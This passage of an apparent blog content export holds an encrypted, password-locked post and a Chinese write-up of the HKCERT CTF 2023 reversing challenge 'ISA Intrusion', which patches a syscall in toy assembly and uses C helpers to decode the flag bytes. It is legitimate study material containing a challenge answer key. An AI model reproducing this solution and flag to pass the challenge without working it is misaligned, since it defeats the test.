0879ba997ed4e07856c269d68693d9d4e6a2fd8601444af9eafa023c1c5387bb87516463110a3605215f29336cf46bec0280d5ee266a393fb1398d2bfb386478a96bff8288e98d9ec27ab9615f7a4fb11ca2e3152ef530b189b99acf85d192e96bec0091a9e5ea13e0dd690eb908cf959992810f165c7e4d86d78eb4e4657989f19b2cbf99c4518b29a9383fcbb39607cb668121a54b82c528a88c5ed1fa2fe61e2c1979f10c675aff2fcf97ec952b24f2ea310d0b006c0815fc374c14495d8a6c72c6c6b063d149b8bcac863fa1804ca7e7d5331b1b801ecbaaa90b96b67eba77efb21c1381e2e26630f40d6a7987f33a8a8fe1e65bd1227995b235f44ca77fbe413b05c6e5223e77239f47686cfcb09464e1a73834eff04ae234ab6c2ecc50465e3a5565a9bdc63ed2cfde017ce47095f9d7012162ca8cbe177558edc60579187a7d1bff3afb374305d73bbe1ec158b3ad19648288c787ccf2c38a566d7c6ea308c251657acbb86ddb1aaaa26c5d954d4168f3f6be519e6a5e08a6ac60105ece0d1e046f40bc98fa2a001dd7163c643de52433fb777e4595d97cb1acd19208d06fd72c62c1beda86cf767ef038094bc31f1e3bc51c807333c974b6e76b7b9a86e3081c253803283c711862786677cf9e1bd0548f20975cf8abbbd33f8982d60eebe29e0b192ee8f352695eb591472ea7e2b0ed4f89b523ed02f0a779ea84175792f8b8280a8c158703e30c0e26e45a3d0f494c4e60677a53db9f56a42c13ca63f0ca515761309e4fd79041119831f9eb6a537a9a40ed21c112c51771dc0aec9c01e9530e231e911dd16ab201595256c826d7e51515b672b7a55b6166129e91aea0c08b4f3e3dbb3f3ef72fa9b8cf1db5c18a3d480558995b759a487273614b6899fc9bdfc2556ab85d7c630449d4ef3fc18453051e4eab20bd225e67faaf5becbb42453ffcd9a76f6cdad2f21f606c4bacf9866f635a23e66ed1d4046c37d7a121ed0b53ac65afb612ca3d337d3341470643e89324af712e5b6b46af5709bbd4714e5ec39eda6b2f8343387a6cfc4c32026eb00e8aa7ffce4db597b17152c67f461b89dda679c7d4b55f3e02370c2487a10c958ba6d269c04329cf7806b56f7bec5c9a254b5098f82ac8db2cdc7d9f992cbcd8d2fa93ebf1528355cb7f9915077680ddebd4794f104f809f74e5959f243e0dcb26151c1c43a0c092b9ec59a2df18c148f1aa3e2687fc5a8eef62de349bd1cb064968988327bf2ee7c03c2bdbcfb7f0b632601fd849b6017ba85c3e0053e6a17ac3fdf6eb14da7b0a4585b4e28e5e9c4adc3efcb89c1f0ea1088d11c49423444ab7282a3489a2222798b8bf6560196ad6282d58bf473bf3143444059f106af48f00ab73e710e8540d6c975bc8b4b81810fdb873abd96db8fa1a7bdd154e6e152098238a41b0c415e692a3ff0d5facabcd17a7393b670570259d39fe60138f0129e0f922706e5c1e70b0c208a44747bd9ace773948a5bd96538e92230698e3a3e1fe7214bcd469de7d987de56dd855e1f44ceaabb3bb42fb883fff1243bf02d81e79ed3a820cb0b8f5fa59f657f808748c3fe054c5a0c975627d58d5c5a3eba5d203e345ce00cb0050539b25fa89c8ff6af138856d1dd3906f941b8a659d24636a851a9dbfc3cd0d73c35d7983d10aee62554c239ecb590efceccf5e68674f276d1be87c428965cc04f2688773b5232f7c8913d7a59f41321214acc2f918e5f1c05776648c153e27245106c39e5e585162c254bfddb53e5a0cbce7ba75c11b9bc9b59a563403fb9c15e82a884b53fbc420b808c99e0cd1ea88e7cf87fb81aa2760d6c21f6bbe4794e21abf1406c527cef8fd562da854a11ccd7e03e24f772fd71cc9fa9e6b6e8150fbb9c51a9ee2fb88e15704f6f056985870a74f3d10abbe917f0798f2f097ab6b2553eb819aaeb7d8cce8942cdfb967a2e97567bd9f9ebea7ff259da321a5a5d5d3d4c311759186b7e35f4473cd8a0d17d5bd6089452967c4d5ffc57d9c8a8bc701bc655787f231a42934dbacdae6645e33aeaf16006f01867b71346852f5fab7731d50b71361b97a4e79ef95efde33fa417755e1ef72973d3c2bd44bf8491126848e1eaab0737ea3544cdab135f1df7fb7d694c05030ef285a55fabb7e02f1ace4ec73766e33a0db3f6e1a38cfd7ae72486ceb834073178c5b201cd10aa3e5114eaab28b2b80801875dbd9e7d02758cd58440fcc4c62a0805549bf52ae7c861ed597b029403df407f676ac9a5802f0a5aa9e76350bd23e709399a978ec51fd89fab90ee60bb5586f097101e188243323a44c7811ef03e9563b9f04d5cff3c95c1db7260f8cf6797625ac9dd61ee56204d5c241dfa6f2b831e9b218ebc61e99602307cc48a3462a4791eb5408488c99103891082756563482cc87489adaa181de2090de511216c25425be6bc666161a81c15920a76e7b9000473bd83fa3290dca0a9842503dafb5570c2b5a56f5d9b7ce8b9c3ce1a3f9fd11c3fa5e69756e85aef253ebc802a91733b21f9f67956baf2276abf9de27508db2228bddb3d61b11ae9c32433c9613bf27b222663c775da7bdc96756bce7f748739a28b8c743f4f38d5f126b9c7f325f254098287467a38409718a66ef0ad6f4b887a8e1cf3f6ea88cb6ce8637dbf111355138586b4882d03ab463cafc5859d5ac6fd0588eb6b9dc7a48866a1fee37e31529f42142c907a93940a8782aae17f372c30362e82114cc723ef458d4a1f4240dfe51f5f2c7cf2578a6898242e5f6d1c51a165d27a82fee56d03c675e92c91fd11d184a45f8c9b554d1f94a11426fd270b2e736bcb621e8dc4ad3329aa0c4e254ff7c480e9da7a12d4dcc62fbc2eec055e7c0640a846f1757e45940f2db6f3a5db195a9fff14e62d32470cfa47bf1c46427511b70bebcd5134008f3e616332260c1e1e6fc44ac6cf71170fe20d3d01bac6c94ed813967276d448e45143d440989e237c28fe249a5a64a6cd1b2be7ad9179c8adb7398b6063efb154148d24388f993442fdc1b293249e7bbf3005a38df35142495f24cb08e9d05ae8e3f5fdd2fac76f1b53e82f1d3c54656be89363d2601045506f4e5f891fdd5eec4d5caeacfb9ce1c0ff3ed703e9f70bed5eda0c24ccc89dca6de17ec204ecadb5e3170dc37a4661ba5b5c8ae385f8cae4f111ef486622d160370b65a803c3cc4d63c4dc7de0314fafe7596b95ba0b409bfe220dbaf02aadcc66d113751e577e619bc524fb7a236cc19efeaed1c29a10bcc66941ef719fa3a743554100a86f260f15fb3846d7fb104d8deee8265e96d88dc2586c4e9394d74f5f81e2cb8c2b83518b59144996990e3d76d258a17f5a4b265d1135d5c0f8fbeca9e9ee7552949d058ed7a60964a63d916970ec06f73da6522e6f633f69a247c789f6378a9b2cb9063d0ceb4a8209128b198b91c3019649650ac229c470bbf1472f46714ab3792faaacd51de0c8cc7dfe10d3a201720ebae036038371647ba8c7fe400d1fda5528726957d669f535d87d16db2e31774827cad0697de9506a46f3326956f94e43710ecd412fabcf50f9fe8a9469bda421f077d111083cf8e93922287194104017e35751c74de50d3f6a2653cdcb8c36b90bb7fe2f27308b37a323bfb129eee4cb68506ea3e881225166b9371660cd676c3a6ee3e3122b96836f369c1bbb2c935db446a9100208525b6fbafa4a217771781afc17e33ad33cefa2c5ed266285b28ade709a7e7342de79905550e25f0dbf49058ce870dd024b01dc1a568aca35fceac4ab3e1d887270398ed0da0df793b6652a3041c91307e307c2473c80127cb94c3078547aec9448fdd71a96d1f4a5f06126aa12bdaa81289c292a8442e4e719414d640ae7b5714838a2dd5d58d345fb2dac8de37c43c9d18a429968a38e07703427d4e59129e7a29aad28e0214fb7610dbac596f235d89479c8e89e1063a086d193b01e32516f11ce2e1afb258e6b3e2124999eb389c9706e3cb0c8b5a541c05bc776d813bccf9d7dc9f18aa40b04fbb56da0b088c2bcee9c0d513a8d9abed03256ae9950318859e1891e56dd713eae81be1772d9b4f394122568d3d4194c39f78940cded8e0d12906e3ddc3fc31b0fe682eccd2dd0ff3bbb8e19e6f4ccbace47089d74ab17c917c5e16473d49b1d25e0462edc38a9cbd0899a9a80fb43937cf2a9ef19209ae1dd284baed688d78e6fe297ddd7cb576053e7cb7e8abd38e965c12d6f24220376cd7aa4cda32cb3ef24d9301f899e592382b860e0efece03a8f15c95496f75152fb32c2a71885cdc049636ddd316ab4f587a1fded87379dae29a7d3416e80e70edd5b837221cdf2333205c8c2b08cc13718df5e1df399da5c972e9075457261ece7ecd29886e8b782455cb7d5327a5bef8127dc2335a9479f5e019589028c0c2911d678bb2d1170ba14ebbd6b121d9eba148e5050fcf5f1b028150dade42efd7613b25dbf824016e6bf716dbdba249dbc0a94c0e5f20a4013b5757997e1780b9988791b6fc5622b56a520a308c67c6152712f127f2da49c9aba0efa1b500424fcf3caffd6df1dd98ad6c548aec99f8c1cfd65e0871d467ffef51ce4930872f899a5bacf2d7c62ec2d9e80ec841586b2920b96361e2c2a22f1ce666195aa33697d22dbb6a8998b49c4efcd4cafe800b3a7373b1fd247bd04bda940dc50d4a37ef06bbbd507425619c1d8ba1ccb0267494e0bf03f07c9c759d104e20e8ff630a19f41cf19f6bc42be22330b9e67590145955f987ba7877ed445151393e773fe1719b1264497dfaed85750aba0e4c3389c3673fec3c2a55844a061a966192fc169e0f6d3177aefe85449d77424ee5e98e78f187312d85803ab37e28963f0028228b2378ea956d1cf39f0eb19e3aea13e5e852a08b56f07e1c9a61da82fdd21677bc551668975ccb97f45453ac932fbb847381198b5d264f3303eb2eae927c3cbcababea47e12d097119b0f5147ada598c90c1ea0ccef27a70357bd3bc2477b64ddbf53b4ded6aa4deeb697957176716113a77893824fc489c16d282c172a1c26fde93a670ade00280bdb49616e7c3390519d3c2ad215545aa7a93ec3cbf3850f77508d2e433cb4327859675a616a3c952009f3237e630fa67419d110511ed8b52254b94f21a1b988a5bc615f201d1c61b936db06401df55e3a3b84f98486c51126f439e1ae3e5fea3d0d418a62e76503d74f57534af265400f9dc10ac7d3bd82b842d62078a36cecdc6f8a14595912ffa7adda03c87c0d956ff6e09f3ce0c94d2ba64b54a9ea210fbb1a0dfdab9c83bf83b3188950e660960bba7debaddb4085347c2efc44971da48fa2ba4ed232d8f413c8cefc58c626ad68d5319db469df789fa57999168c490156e2b205b94af787523981303e0708b2cc8c4219062b2ea5cc1edfbcfa9e083f30905dc058346a8fa0456373255c23c44b048484bf58f7dad83f0127204dc8e0e5891f84ae53e7c9f385c5bd178bf63db4bcedfac89e04f744f1fdb03f6241efe07d08c2b623a612f6b77facbb79c340e2a1630295283c2d77fb9fb524bd3d64e93740e7e2f784bfdfde34ad70dbe6bebd60b3dbca34cee1ab40c86132c17ae5ed82756eeb53812c812a70624757088adc7f78d74ffa0efd9890eccadfd3d4913b74b361ae9ad11f1fbe218b5300ab5f599f04b5affe0c4ee88d172447bd8d150c20012108541e5960ffe94f7d4d5465af0c1b7bf06d6c5d4b681eba21ca1153d3d5240153a57a96c4d06544491d4844c56af10fdfe7b725ce286aef7d69c873b24dbe8f92018ef579244ba07b1723620f987a64a46d01bdca6755adef914e623f530629ab81e7fb94291a8f2e76bf5117e8149ce13b2df776e3dec2554c7195d6113d6c1340771859a0c3d70b544d6b21e4b0be04166b0c44ba82fbe23a5b16bbbe52cb87078dfd1cba0982a6c8e9a7d9071d34d7a7cc4e457b71b6486cd5592b7e39cf3b9b4f7ec3dcb73e54c20527aeb024258f33ba6921bcbc4b096a0f1ad9ee9602813179a5e28898510d8c8095fc4ba664a704df77e57cf1288a0e6a60967021c6f82f0067e42e73530e4c5a23d82973bdf57b0daeb46aa5f1eca982a9d5e9821665836aadbe9b7f857cbea2f095be047f4abc7fc9598506e409d25997c66ec2c5145c9242f035ae40afcf3f587982219f48c1b463d0634bc2b6087081cf28a218d422381ca712b844c850335837095ca2ed5de837c7fcf1c5a3f5adbe49deba26379141dc586c5f9ecf74bcbc3ff8d3699d0bda1a71b83bf29182786cf1ce92831cc307cd73777f01d9e08352799f6ca7542477d07c0fb84f7aa0eba53c202be579ed208c202d89c7963710b9afc8a7516c48f98046b906b0cce218cc1aa83871e124a82c376d4fef239c092b3972fa890b58d9129cbd4907d7dec4187987d60faa61217acc87c2fe9265e6729f271bd5a4d198edfa95f10d0ce4859e2fb0bd79a1eb50b7b648b9d7a7f3a264f72e220f41b27a12ef677a017d4258672c76c77a8e3185ff133cef3b757a2912fd65858a46c5cc2621c6fc789ab7c71e6507f5c0021c5153e9fd91fab85673cd6f41cbf835258487fbab5768b345cc37bd1d15f3628f20e614ba4949631a7809ef05ce17135bce83c2119094401a3fadbde0b9efbfb4bfbf1bd1ac3865a5e19178bb593f3f56b09e9f307a8d293e15578277d707bbae4aa522f7c1c9e156ebed3fcc91b1004e5fbe820b16427b3f1c01797c8f6fb0a53154f19e899d705d1fff73bceafc9267fc8ad3bf5809469dd93b6d66e540fd1f2131d151c394306aab45788654c5624c601b0ef52ad8ea475f94806cce092e2c3af3ef0db6b09abe4dfeb21efa3e0e4162e520ea1c4c8f0f1da5fd6929a3e314f07080b98a775ca2b7fa6c4d796bb18a21ef764a7dcafd1d81db80d032abbee7cfcdb61bd8766fe2e71e3914d811bda526afa8f59e4693ec4a5921d0f12c85aa568e7b7f5570a564a098ad5d26f78ee70ac8538b754ecfc0247e1b6e536984a4db17c3368df11a70e32427297fe4a0012ff00954097d0d1131f9ed70d1730174e38039a88b6aa7b22b8850ba55adca27890afac789d01ef7eccbda5f020d166bbde87cfeac7de8fac2cf83dac39849bee87cfee442e6ff7a5bd7e2a413a2f9dcb6f07a7e44422f1c6c23445a43879aa6ca29b7a1afc4457c943c05cf7834a8beca37ca352955959c126257060a5799ddf30ecb53cc40fcfce25b1ff63c6482fc79bd9f2282b042a76ce6fb1a1735ef09e380e7337db5bb91636c280e9aa37d9dac69b9f95f8e00fc1b4c4c74983f667d0eeddb18e2fbb7cd58c9635ed2f209f3a192c5665cd45b056b0c271ad48eacaf564e0e2079edd453f10af0b223905c0faa5f76161bcaed4cce5faf04f36f86a71593806e103be5baa93868b0f958460425692a822de19481a120a52d021c238a9c657cedf7e17e9aa1b513b02960aad9e22af5359294e941175cfb4dad11feb97d2ac1011d86bea79fcb010337844e3d97a73993629029c28ab88fce85e177b353566aef0338a6d74dd07c6aba915f1d38df5250a8e0669d4ad1baddfcf169ccaf867f714efe24ea1a2a53a86e02516105f7a1a0949a56a46f698f8febc7be4edbb79dfd101dc05e70060c5a724499ccd1d1b676acd8985a2644746032855452407c92f23504c3282e5f6d09eac637e8074f56e84b5a3ab226a6e016093bdfb36db40ec46fa326d3bb5a5939020323b9607e2510167d11ae08a08dc9b6d6171a30e933892f64bc9ccfba7ddd82bad1f053c71715d16295aeb9b7a1bf414f1f902f2dd98c33ae21e3769028e01a5134d33f08135afa51ae0ba610f54d38e4574047e7ab4c984e2365eb4d6feb04effd91764558611116632249681169bdc3e5ec568cb722d9711525ab22e8b5635f52869c7e2813ccbf1b6226e9b979ad21c3a5d3c6bf107665584b244241d2f8792814cee437f38ef887ae56cab082f4cc894ac41dec358aa36b32804f611279bb8609a7dad586f933b3daaab7b24df4439f218672b81d4c3c50e47ea3f8884cce62ae7b3a8598eadf6e4bb34d6556968f0da58a8039fa7d68c09b609fb557cfb56e770e3af56523f789a4cd2f43b1c5207a00f9f21edd36351322315b4cc4806ed01cc87d7727f0258195dcf8dc1b83d9019dce2c10d6c94ee4adcdb7a46d74a2211de4b6a749bda63b81a7b2552a47b1f4d33134b551b9ccac673e551cc7677bda6292f6c78b00635a40a0c91cf5e65294580a9fc9d54c9b524d0aad728cc73bf05d562ed4735f7e9155016a379558fe605905ebaf9f4f3f50c1a60267915c9e928753fb51b914a06b4fc7302997d9112efefcbfaea9cbf81bbd7c464555d04256ca82cce40c73c059370b89927a635d734888870bae80dd1f090a4bc659bb344ca2d6e24be211f13ce49bb448a377c652da51f5055a29103d4bc719a646c923619f7aff096e21b646f176092a85fa7999e468d6a1837a3a2d9851437ecbfbadeb01c53eec26471273b57470d3db39f369b5f049f6488b05189529b954d5a3025d4e6f5df382192f850f4f91e470ef3b03bd5b1a884eac74a36850198af503070513525d04c099943af9f1de87b9485284faf6b912a128e6bfb6fbf5b6013f3c88e2b88bf15bc6185aee1e9bbf06ff3967aaf9354457d4866ff0dd61c81ca23c17573a428b30b2c3168f462a4a075b8c2eeaf6bd5362c6258d71bbd26b3a2b4fece250030d1cbef643a8bf14a81c8fb2f0327a69ebd569ebc9fd93347b44ff1513a88adae49116e9ebf37b85463a963517c50a033dc53c96a353c8e7b66016eddc24892f1f694656e53362264eb154db31b568bc8d2c6f99c997577bd9fe9f6f1106b0b2f937ea813e45a34a95987727a7e0318595a5d5cb05967a13fd6daad96a6e03ba3ee105c58880fe860b1b65daaa36293c1f1b05aedc88e5c2f353852782caa7ce9eb61322ebe9f79132174be73b3db70420a7abece67cf36753fef86a8e17ff4b205942c0e505ad02cb645baf3d9b2d944236b4a51f0878c2502ab825af376b0b848ee655fd60cb400164b761d8189c50cf3bc7dc2abd7edecbeb4e019fc3eb6857173e85257eece99047336aefd239643ae3e58a0f62e854d03fced0dbfe30e34637dffd05a5780effea18a6d10f77cf5a7e3aac89e08ea528cc2a341f55ded0d1bdafa232ebd780a6bbea03cab58899e5a174547c33aa106d8484228ecd8f9a767bd3f5a48a292251bccfba1e4fa962bfd462e70fb7ded81ae3f31a6809bc85d9853f5b925ce0edfeff6cdb121fc53890fc23e79105668f3e3b8cb785f6138f85087b6b850a460b689cc35a84c08a1268af9b2a0defb4c7a5bb1fdfa35d4d1f0f1fcbbdfcdcf58731e29d73b2d35ee15194e16fb9bbdf95b2f64d6e80f77bc23566cc400d590069c54cdef963e6c77e534e3771555ec3dc969f80b7f891a593c0d4ba0a526fad59586e124e62442d460ad6518a425f24cca8bf93c9cad1c18219423c85a2bdb3664ad816b4a0257dacf44af757391c57112ef582020100a892185e00919ce74103323f9059f06aeb32db63889618825ab969741baae82fcadbd4d12d900115b8b4a733b934314</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> Ruijie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-HKCERT-CTF2023</title>
      <link href="/202367c4e27d1414/"/>
      <url>/202367c4e27d1414/</url>
      
        <content type="html"><![CDATA[<p>唯一做出来的一道…</p><h1 id="reverse">Reverse</h1><h2 id="isa-intrusion">ISA Intrusion</h2><p>这个题是在线平台,貌似是ARM架构的汇编,同时有其他题的代码,将本题的汇编代码复制到第一个选项去调试分析.</p><p>发现实际上程序对栈底的一段数据进行了3轮循环,每个循环都进行一种变换.</p><p>代码第一次尝试运行,发现并没有以正常的0值返回,而是返回65:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231113235555883.png" alt="image-20231113235555883"></p><p>下断点进行调试发现程序始终在最开头的一个简单的循环运行,最终崩溃(貌似是循环太大了,对这种汇编不是很了解),静态分析发现这个循环可以直接删除:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114000137754.png" alt="image-20231114000137754" style="zoom:50%;" /><p>后面的分析就很简单了,就是压栈4段数据,其中栈底的那一段是密文.</p><p>代码使用另外的3段数据对密文依次进行3次循环,每次循环都进行简单的变换(按位异或,按位与,按位或).</p><p>然后发现程序在最后的4行进行了一个syscall,经过测试(当时因为发现还有其他代码,可能也算是非预期?)发现R8寄存器中存储的是&quot;系统调用号&quot;(ARM也有这个吧大概?),不过和x86,x64不一样.</p><p>这里的2对应<code>exit</code>,1对应<code>write</code>,所以把代码最后的4行换成如下的5行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; MOV R1, 0;</span><br><span class="line">; MOV R8, 2;</span><br><span class="line">; SYSCALL;</span><br><span class="line">; ADD SP, 412;</span><br><span class="line">MOV R1,R4;</span><br><span class="line">MOV R2,200;</span><br><span class="line">MOV R8,1; 1相当于x86的write的系统调用号</span><br><span class="line">SYSCALL;</span><br><span class="line">ADD SP,412;</span><br></pre></td></tr></table></figure><p>这样就能输出栈底的flag(起始地址为<code>0xffffff88</code>):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114001113136.png" alt="image-20231114001113136" style="zoom:50%;" /><p>注意得记得把开头的那个循环删掉.</p><br><p>或者费劲点也可以复制出来手动输出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// export_data.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ogn[] = <span class="string">&quot;ffffff8865636b68ffffff8c33327472ffffff906d30737bffffff946d317433ffffff9837695f33ffffff9c34655f73ffffffa072336973ffffffa45f30375fffffffa8346e7964ffffffac5f63316dffffffb05f763372ffffffb47435756affffffb87434705fffffffbc6c266863ffffffc05f6b6f30ffffffc46d5f7434ffffffc8726f6d33ffffffcc00007d79&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ogn); i += <span class="number">8</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        i += <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(str + j, ogn + i, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str);i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%c%c&quot;</span>,str[i],str[i+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取出来然后输出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// print_flag.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// export_data.exe输出的结果放入</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">1000</span>]=<span class="string">&quot;\x65\x63\x6b\x68\x33\x32\x74\x72\x6d\x30\x73\x7b\x6d\x31\x74\x33\x37\x69\x5f\x33\x34\x65\x5f\x73\x72\x33\x69\x73\x5f\x30&quot;</span></span><br><span class="line">                   <span class="string">&quot;\x37\x5f\x34\x6e\x79\x64\x5f\x63\x31\x6d\x5f\x76\x33\x72\x74\x35\x75\x6a\x74\x34\x70\x5f\x6c\x26\x68\x63\x5f\x6b\x6f\x30&quot;</span></span><br><span class="line">                   <span class="string">&quot;\x6d\x5f\x74\x34\x72\x6f\x6d\x33\x00\x00\x7d\x79&quot;</span>;</span><br><span class="line">    <span class="comment">// 4个字符一组进行翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="type">char</span> tmp = str[i];</span><br><span class="line">        str[i] = str[i + <span class="number">3</span>];</span><br><span class="line">        str[i + <span class="number">3</span>] = tmp;</span><br><span class="line">        tmp = str[i + <span class="number">1</span>];</span><br><span class="line">        str[i + <span class="number">1</span>] = str[i + <span class="number">2</span>];</span><br><span class="line">        str[i + <span class="number">2</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="built_in">puts</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114001249077.png" alt="image-20231114001249077" style="zoom:50%;" /><p>结束…</p><p>附带当时拷贝下来的汇编指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span 